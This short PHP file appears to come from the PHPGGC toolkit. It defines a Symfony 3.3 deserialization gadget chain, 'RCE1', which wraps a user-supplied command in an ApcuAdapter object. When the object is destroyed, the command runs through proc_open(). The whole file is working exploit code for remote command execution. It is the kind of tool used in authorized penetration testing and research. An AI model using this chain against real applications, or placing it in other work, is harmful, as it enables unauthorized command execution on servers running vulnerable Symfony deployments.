<?php

namespace GadgetChain\Symfony;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '3.3';
    public static $vector = '__destruct';
    public static $author = 'cf';
    public static $informations = 'Executes given command through proc_open()';
    public static $parameters = [
    	'command'
    ];

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Symfony\Component\Cache\Adapter\ApcuAdapter(
        	$command
        );
    }
}
